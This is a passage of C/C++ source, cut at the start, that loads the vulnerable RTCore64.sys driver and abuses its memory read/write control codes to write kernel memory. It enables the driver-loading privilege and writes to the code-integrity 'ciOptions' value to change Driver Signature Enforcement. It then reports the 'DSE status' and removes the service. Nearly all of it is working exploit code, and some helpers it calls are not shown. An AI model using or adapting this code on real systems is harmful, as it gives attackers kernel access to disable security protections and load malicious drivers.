        DeleteService(schService);
        // close service handle
        CloseServiceHandle(schService);
    }

    // close service manager handle
    if(schSCManager != NULL) CloseServiceHandle(schSCManager);

    // mark registry service key for deletion
    // we do not check the return value, because it may be no service entry present at startup
    //lint -e{534} Warning 534: Ignoring return value of function
    //lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
    MyMarkServiceForDeletion(rtcore);

    // delete vulnerable driver
    // we do not check the return value, because it may be no driver file present at startup

    return rc;
}


typedef struct _RTCORE64_MEMORY_READ_WRITE
{
    BYTE Unknown0[8];
    DWORD64 Address;
    BYTE Unknown1[8];
    DWORD Size;
    DWORD Value;
    BYTE Unknown2[16];
}RTCORE64_MEMORY_READ_WRITE,*PRTCORE64_MEMORY_READ_WRITE;


int MyRTCore64OpenDevice(char *szDriverSymLink,HANDLE *hDevice)
{
    // open device handle to driver
    *hDevice = CreateFile(szDriverSymLink,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(*hDevice == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    return 0;
}
#define RTCORE64_MEMORY_READ_CODE 0x80002048
#define RTCORE64_MEMORY_WRITE_CODE 0x8000204C

int MyRTCore64WriteMemory(HANDLE hDevice,DWORD64 dw64Address,DWORD dwSize,DWORD dwValue)
{
    // prepare write memory buffer for RTCore64.sys driver
    RTCORE64_MEMORY_READ_WRITE RtCore64MemoryReadWrite;
    memset(&RtCore64MemoryReadWrite,0,sizeof(RTCORE64_MEMORY_READ_WRITE));
    RtCore64MemoryReadWrite.Address = dw64Address;
    RtCore64MemoryReadWrite.Size = dwSize;
    RtCore64MemoryReadWrite.Value = dwValue;

    // send write memory control code to RTCore64.sys driver
    DWORD dwBytesReturned;
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4 and 6) unsigned long long to unsigned long
    if(DeviceIoControl(hDevice,RTCORE64_MEMORY_WRITE_CODE,&RtCore64MemoryReadWrite,sizeof(RTCORE64_MEMORY_READ_WRITE),&RtCore64MemoryReadWrite,sizeof(RTCORE64_MEMORY_READ_WRITE),&dwBytesReturned,NULL) == FALSE)
    {
        return 1;
    }

    return 0;
}
int MyRTCore64ReadMemory(HANDLE hDevice,DWORD64 dw64Address,DWORD dwSize,DWORD *dwValue)
{
    // zero return value
    *dwValue = 0;

    // prepare read memory buffer for RTCore64.sys driver
    RTCORE64_MEMORY_READ_WRITE RtCore64MemoryReadWrite;
    memset(&RtCore64MemoryReadWrite,0,sizeof(RTCORE64_MEMORY_READ_WRITE));
    RtCore64MemoryReadWrite.Address = dw64Address;
    RtCore64MemoryReadWrite.Size = dwSize;

    // send read memory control code to RTCore64.sys driver
    DWORD dwBytesReturned;
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4 and 6) unsigned long long to unsigned long
    if(DeviceIoControl(hDevice,RTCORE64_MEMORY_READ_CODE,&RtCore64MemoryReadWrite,sizeof(RTCORE64_MEMORY_READ_WRITE),&RtCore64MemoryReadWrite,sizeof(RTCORE64_MEMORY_READ_WRITE),&dwBytesReturned,NULL) == FALSE)
    {
        return 1;
    }

    // return read value
    *dwValue = RtCore64MemoryReadWrite.Value;

    return 0;
}


int main() {


    typedef DWORD(WINAPI* Proto_NtQuerySystemInformation)(int SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    Proto_NtQuerySystemInformation fnNtQuerySystemInformation = (Proto_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

    HMODULE hNtoskrnl = LoadLibraryEx("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);

    GetKernelBaseInAddressSpace();
    MyGetImageBaseInKernelAddressSpace();
    UINT64 keAreApcDisAddr=kernel_base+0x2b6dc0;
    printf("KeAreApcDisabled kernel function address: %p\n",keAreApcDisAddr);



    ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == NULL) {
        return false;
    }


    MyCreateAndStartService();
    auto customRtlAdjustPrivilege = (myRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
    BOOLEAN SeLoadDriverWasEnabled;
    NTSTATUS Status = customRtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
    if (!NT_SUCCESS(Status)) {
        printf("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
        return false;
    }
    LoadNTDriver();


    printf("\nStarting device control\n");
    myDeviceIoControl dynamicIoControl = (myDeviceIoControl) GetProcAddress((HINSTANCE) LoadLibrary("kernel32.dll"),
                                                                            "DeviceIoControl");

    HANDLE hDevice = nullptr;

    printf("Error status: %d\n",MyRTCore64OpenDevice("\\\\.\\RTCore64",&hDevice));
    MyRTCore64WriteMemory(hDevice,ciOptions,1,1);

    DWORD dse=1;
    MyRTCore64ReadMemory(hDevice,ciOptions,1,&dse);
    printf("DSE status: %d",dse);


    //printf("%s",exec(stream).c_str());    return 0;
    MyStopAndDeleteService();

}

